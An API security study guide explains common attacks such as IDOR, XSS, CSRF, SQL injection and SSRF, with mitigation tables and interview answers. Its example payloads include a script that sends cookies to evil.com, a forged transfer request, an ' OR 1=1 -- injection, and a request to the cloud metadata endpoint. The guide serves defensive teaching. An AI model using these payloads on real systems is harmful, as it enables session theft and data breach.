# API Security Attack Types & Mitigation Guide

---

## 📋 Quick Reference: All Attack Types

### A. Authorization & Logic Attacks
- Broken Object Level Authorization (BOLA/IDOR)
- Broken Function Level Authorization (BFLA)
- Object Property Authorization Issues
- Mass Assignment
- Excessive Data Exposure
- Business Logic Abuse

### B. Authentication & Identity Attacks
- Credential Stuffing
- Brute Force
- Token Theft / Reuse
- Session Fixation
- Weak Token Validation

### C. Injection Attacks
- SQL Injection (SQLi)
- NoSQL Injection
- Command Injection
- LDAP Injection

### D. Client-Side Attacks
- XSS (Stored / Reflected)
- CSRF

### E. Abuse & Automation Attacks
- Bot Scraping
- API Enumeration
- OTP Abuse
- Account Takeover Attempts

### F. Availability Attacks
- DDoS (L3/L4)
- Application-layer DoS (L7)
- Resource Exhaustion

### G. Infrastructure & Integration Attacks
- SSRF (Server-Side Request Forgery)
- Unsafe Deserialization
- Unsafe Consumption of Third-Party APIs
- Security Misconfiguration

---

## 📊 Comprehensive Attack Matrix

| # | Attack | Plain English | Root Cause | Edge Mitigation | Application Mitigation |
|---|--------|---------------|-----------|-----------------|----------------------|
| 1 | **SQL Injection** | Input treated as SQL code | Input concatenation | WAF patterns | Prepared statements |
| 2 | **NoSQL Injection** | JSON operators injected | Input in queries | WAF (limited) | Query builders, validation |
| 3 | **XSS** | JS injected & executed | Unsafe output rendering | WAF blocking | Output encoding, CSP |
| 4 | **CSRF** | Attacker tricks browser | Auto-sent cookies | SameSite cookies | CSRF tokens, avoid cookies for APIs |
| 5 | **BOLA/IDOR** | Accessing others' data | Blind trust in IDs | ❌ Not reliable | Ownership checks (ABAC) |
| 6 | **BFLA** | Calling unauthorized APIs | Missing role checks | Route checks | Explicit permission checks |
| 7 | **Mass Assignment** | Client sets forbidden fields | Unfiltered DTO binding | ❌ | DTO whitelisting |
| 8 | **Excessive Data Exposure** | API returns too much | Full entity returned | ❌ | Response shaping |
| 9 | **Credential Stuffing** | Bots try leaked passwords | Automated attempts | Rate limiting, bots | MFA, lockouts, anomalies |
| 10 | **Brute Force** | Guessing passwords | Rapid retries | Rate limiting | Lockouts, CAPTCHA, MFA |
| 11 | **Bot Scraping** | Automated data extraction | High-volume crawling | Rate limiting, bots | Pagination limits, anomalies |
| 12 | **API Enumeration** | Finding valid IDs | Sequential probing | Rate limiting | Uniform errors, UUIDs |
| 13 | **Replay Attacks** | Reusing valid requests | Captured tokens/requests | TLS, short TTL | Idempotency keys, nonces |
| 14 | **SSRF** | Server calls internal URLs | User-controlled fetch | URL blocking | Allowlists, egress firewall |
| 15 | **Deserialization** | Code executes on parse | Crafted objects | Schema validation | Disable unsafe deserialization |
| 16 | **Command/LDAP Injection** | Executed as commands | Unsafe execution calls | WAF | Safe APIs, escaping |
| 17 | **L7 DoS** | Resource exhaustion | Large payloads, loops | Rate limiting | Backpressure, timeouts |
| 18 | **DDoS (L3/L4)** | Network flood | Volumetric traffic | CDN, DDoS protection | ❌ (infrastructure) |
| 19 | **Security Misconfiguration** | Unsafe defaults | Open CORS, debug endpoints | ❌ | Secure configs, audits |
| 20 | **Unsafe API Consumption** | Trusting external data | Third-party injection | ❌ | Validate & sanitize responses |

---

## 🔴 Critical Attacks (Must Know in Depth)

### 1️⃣ Broken Object Level Authorization (BOLA/IDOR)

**Definition:** Authenticated user accesses another user's object by manipulating IDs.

**Real-World Example:**
```
GET /accounts/123   (your account - allowed ✅)
GET /accounts/124   (stranger's account - should fail but works ❌)
```

**Why It Happens:**
- ID is used directly from request without validation
- No ownership verification
- Developers assume authentication = authorization

**Impact:**
- Direct data breach
- Regulatory violations (GDPR, HIPAA)
- Fraud and financial loss

**Mitigation:**
| Layer | Approach |
|-------|----------|
| **Service** | ✅ ABAC-based ownership checks (PRIMARY) |
| **Code** | ✅ Verify user owns the resource before returning data |
| **Edge** | ❌ Cannot be fixed (requires business logic) |

**Interview Answer:** "BOLA is stopped entirely at the service layer with explicit ownership checks. The gateway cannot help because it lacks business context."

---

### 2️⃣ Broken Function Level Authorization (BFLA)

**Definition:** User calls privileged APIs they shouldn't access.

**Real-World Example:**
```
POST /admin/close-account     (normal user tries this)
POST /admin/delete-all-users  (attacker escalates)
```

**Why It Happens:**
- Only authentication verified, not role/permission
- Endpoints not adequately restricted
- Permission checks missing per operation

**Impact:**
- Privilege escalation
- Data deletion / corruption
- Regulatory violations

**Mitigation:**
| Layer | Approach |
|-------|----------|
| **Service** | ✅ Role/permission checks per operation |
| **Code** | ✅ Explicit authorization decorators |
| **Edge** | ⚠️ Route-level blocking (coarse) |

---

### 3️⃣ XSS — Cross-Site Scripting

**Definition:** Attacker injects JavaScript that executes in another user's browser.

**Attack Vector:**
```html
<!-- User input (malicious) -->
<script>fetch('evil.com/steal?c='+document.cookie)</script>

<!-- Stored in database, rendered unsafely -->
<p>User Comment: <script>...</script></p>
```

**Types:**
- **Reflected:** URL parameter echoed back unsafely
- **Stored:** Malicious input saved & served to others

**Impact:**
- Cookie/token theft
- Session hijacking
- Credential capture
- Malware distribution

**Mitigation (Layered):**
| Layer | Approach |
|-------|----------|
| **Application** | ✅ Output encoding (HTML escape special chars) |
| | ✅ Content Security Policy (CSP) headers |
| | ✅ HttpOnly cookies (limits damage) |
| **Edge** | ⚠️ WAF (basic pattern blocking) |

**Key Point:** HttpOnly cookies reduce damage but don't prevent XSS.

---

### 4️⃣ CSRF — Cross-Site Request Forgery

**Definition:** Attacker tricks a logged-in user's browser into making unauthorized requests.

**Attack Flow:**
```
1. User logged into: bank.com (session cookie stored)
2. User visits (in same browser): evil.com
3. evil.com triggers:
   <img src="https://bank.com/transfer?amt=1000&to=attacker">
4. Browser automatically sends bank.com cookies
5. Request succeeds (looks like legitimate user)
```

**Impact:**
- Money transfers
- Profile modifications
- Account lockouts
- Silent fraud

**Mitigation:**
| Layer | Approach |
|-------|----------|
| **Application** | ✅ CSRF tokens (unpredictable, per-request) |
| | ✅ SameSite cookie attribute (blocks cross-site sends) |
| | ✅ Avoid cookie-based auth for APIs |
| **Design** | ✅ Bearer tokens (sent in headers, NOT affected) |

**Key Point:** Bearer tokens in Authorization headers are **NOT vulnerable** to CSRF because browsers don't auto-send them cross-site.

---

### 5️⃣ SQL Injection (SQLi)

**Definition:** User input is treated as SQL code instead of data.

**Attack Example:**
```sql
-- Vulnerable code
SELECT * FROM users WHERE name = '' + input + '';

-- Attacker input
' OR 1=1 --

-- Executed query
SELECT * FROM users WHERE name = '' OR 1=1 --';
-- Returns ALL users
```

**Impact:**
- Read all database records
- Modify balances, permissions
- Delete tables
- Execute commands (depending on DB)

**Root Cause:** String concatenation instead of parameterization.

**Mitigation (Ranked by Effectiveness):**
| Layer | Approach | Effectiveness |
|-------|----------|---|
| **Application** | ✅ Prepared statements / parameterized queries | 100% |
| | ✅ ORMs with safe query builders | 95% |
| **Edge** | ⚠️ WAF (pattern detection, bypassable) | 70% |

**Interview Answer:** "Prepared statements are the only real fix. WAF is secondary defense. Prepared statements separate code from data at the database layer, making injection impossible."

---

### 6️⃣ SSRF — Server-Side Request Forgery

**Definition:** Attacker tricks your server into calling internal or sensitive URLs.

**Attack Example:**
```
Endpoint: POST /fetch-external?url=https://example.com

Attacker sends:
POST /fetch-external?url=http://169.254.169.254/latest/meta-data

Server fetches cloud credentials, internal services, admin endpoints
```

**Common Targets:**
- AWS metadata endpoint (`169.254.169.254`)
- Internal admin dashboards
- Database ports
- Kubernetes API server

**Impact:**
- Cloud credential theft
- Internal network exposure
- Database access
- Service-to-service impersonation

**Mitigation:**
| Layer | Approach |
|-------|----------|
| **Application** | ✅ URL allowlists (whitelist safe domains) |
| | ✅ Block known internal IPs (127.0.0.1, 10.x.x.x, etc.) |
| **Network** | ✅ Egress firewall rules |
| **Edge** | ⚠️ URL blocking (partial) |

---

### 7️⃣ Credential Stuffing

**Definition:** Automated login attempts using stolen username/password lists.

**Attack Flow:**
```
1. Attacker obtains: 1M leaked user/pass pairs
2. Bot tries credentials across services:
   - Bank
   - Email
   - E-commerce
3. Users reuse passwords → Success rate 1-5%
4. Attacker has accounts on multiple platforms
```

**Why It Works:**
- Password reuse across sites
- No MFA
- Weak account lockout policies

**Impact:**
- Account takeover
- Fraud (payment, identity)
- Regulatory violations
- Customer trust loss

**Mitigation (Layered):**
| Layer | Approach |
|-------|----------|
| **Edge** | ✅ Rate limiting (slow down bots) |
| | ✅ Bot detection (behavioral analysis) |
| **Application** | ✅ MFA (prevents takeover even with password) |
| | ✅ Account lockout (after N failures) |
| | ✅ Anomaly detection (unusual login locations) |

---

### 8️⃣ Unsafe Deserialization

**Definition:** Server executes malicious code while deserializing untrusted data.

**Attack Example (Java):**
```java
// Vulnerable
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // Executes code during deserialization

// Attacker sends crafted serialized object with malicious gadget chains
// Code executes automatically
```

**Impact:**
- Remote Code Execution (RCE)
- Full server compromise
- Data exfiltration

**Root Cause:** Native deserialization trusts object structure.

**Mitigation:**
| Layer | Approach |
|-------|----------|
| **Application** | ✅ Disable native deserialization |
| | ✅ Use JSON with strict schemas |
| | ✅ Validate input before deserializing |
| **Framework** | ✅ Use safe serialization (protobuf, msgpack) |

**Interview Answer:** "Never deserialize untrusted data with native methods. Always use JSON or schema-validated formats. If you must deserialize, whitelist allowed classes."

---

## 🎯 Attack-to-Layer Mapping

### Which Layer Stops Which Attack

| Attack | Edge (WAF/Gateway) | Service (Code/ABAC) | Database | Notes |
|--------|-------------------|-------------------|----------|-------|
| **SQLi** | ✅ WAF patterns | ✅ Prepared statements | ✅ | Defense in depth |
| **XSS** | ✅ WAF blocking | ✅ Output encoding, CSP | ❌ | No DB protection |
| **CSRF** | ❌ | ✅ Tokens, SameSite | ❌ | Only app/design can fix |
| **BOLA** | ❌ | ✅ Ownership checks | ❌ | Requires business logic |
| **BFLA** | ⚠️ Coarse routing | ✅ Permission checks | ❌ | App-level enforcement |
| **Mass Assignment** | ❌ | ✅ DTO whitelisting | ❌ | App-level only |
| **Excessive Data** | ❌ | ✅ Response shaping | ❌ | Business logic |
| **Credential Stuffing** | ✅ Rate limit, bot detection | ✅ MFA, lockout | ❌ | Hybrid defense |
| **Brute Force** | ✅ Rate limit | ✅ Lockout, CAPTCHA | ❌ | Hybrid defense |
| **Bot Scraping** | ✅ Rate limit | ✅ Pagination | ❌ | Hybrid defense |
| **Enumeration** | ✅ Rate limit | ✅ Uniform errors, UUIDs | ❌ | Hybrid defense |
| **Replay** | ⚠️ TLS (prevents capture) | ✅ Short TTL, idempotency | ❌ | Hybrid defense |
| **SSRF** | ⚠️ URL blocking | ✅ Allowlists, firewall | ❌ | App-level primary |
| **Deserialization** | ❌ | ✅ No native deser | ❌ | App-level only |
| **DDoS (L3/L4)** | ✅ CDN, DDoS service | ❌ | ❌ | Infrastructure only |
| **Misconfiguration** | ❌ | ✅ Secure defaults | ❌ | App-level only |

### Defense in Depth (How Layers Work Together)

```
User Request
    ↓
[TLS] ← Prevents MITM, eavesdropping
    ↓
[CDN/DDoS] ← Blocks volumetric attacks
    ↓
[WAF] ← Stops SQLi, XSS patterns
    ↓
[Rate Limiting] ← Stops brute force, scraping
    ↓
[Authentication] ← Verifies identity
    ↓
[Authorization] ← Checks permissions (BOLA, BFLA)
    ↓
[Business Logic] ← Applies workflow rules
    ↓
[Database] ← Prepared statements prevent injection
```

---

## 🚨 Common Anti-Patterns (Don't Do These)

| Anti-Pattern | Why It's Wrong | What To Do Instead |
|--------------|----------------|-------------------|
| ❌ "User is authenticated, so it's fine" | Authentication ≠ Authorization | Check permissions explicitly |
| ❌ "Gateway will handle authorization" | Gateway has no business context | Authorize at service level (ABAC) |
| ❌ "Internal APIs are safe" | Internal can be compromised too | Apply same security rigor |
| ❌ "We'll fix security later" | Technical debt multiplies | Build security from day 1 |
| ❌ "String concatenation is fine" | Opens door to injection | Always use prepared statements |
| ❌ "Return full entity, client filters" | Data already leaked | Shape response at service |
| ❌ "Errors should be verbose" | Enables enumeration | Uniform error messages |
| ❌ "Sequential IDs are fine" | Enables BOLA + enumeration | Use UUIDs/non-sequential |

---

## ✅ Security Best Practices (FS-Grade)

### Authorization & Data Protection
- ✅ **Always enforce ownership checks** (BOLA prevention)
- ✅ **Never trust client-provided IDs** (validate at service)
- ✅ **Use ABAC for fine-grained control** (attributes, not just roles)
- ✅ **Minimize data exposure** (return only required fields)
- ✅ **Shape responses per operation** (different views for different scenarios)

### Authentication & Tokens
- ✅ **Use short-lived tokens** (5-15 min expiry)
- ✅ **Implement refresh token rotation** (prevent long-term compromise)
- ✅ **Store tokens in HttpOnly cookies** (prevent XSS theft)
- ✅ **Validate all token claims** (iss, aud, exp, sub)

### Input & Output
- ✅ **Use prepared statements** (for ALL database queries)
- ✅ **Escape output** (HTML entities for XSS prevention)
- ✅ **Validate input schemas** (strict type checking)
- ✅ **Block known bad patterns** (but don't rely on WAF alone)

### Rate Limiting & Abuse Prevention
- ✅ **Rate limit everything** (login, API calls, file uploads)
- ✅ **Detect bot patterns** (behavioral analysis)
- ✅ **Limit pagination** (prevent mass scraping)
- ✅ **Uniform error messages** (don't reveal valid IDs/users)

### Monitoring & Maintenance
- ✅ **Maintain API inventory** (know all endpoints)
- ✅ **Log security events** (failed auth, permission denials)
- ✅ **Regular security audits** (penetration testing)
- ✅ **Keep dependencies updated** (patch vulnerabilities)

---

## 📝 Summary: The 5-Layer Security Model

| Layer | Responsibility | Examples |
|-------|----------------|----------|
| **Infrastructure** | DDoS, network attacks | CDN, firewalls, IPS |
| **Transport** | Eavesdropping, MITM | TLS/HTTPS |
| **Edge** | Volumetric abuse, pattern-based attacks | WAF, rate limiting, bot detection |
| **Application** | Business logic abuse, authorization | Permission checks, ABAC, validation |
| **Data** | Injection, exposure | Prepared statements, encryption |

**Key Principle:** No single layer provides complete security. Defense in depth means multiple layers, each blocking different attacks.
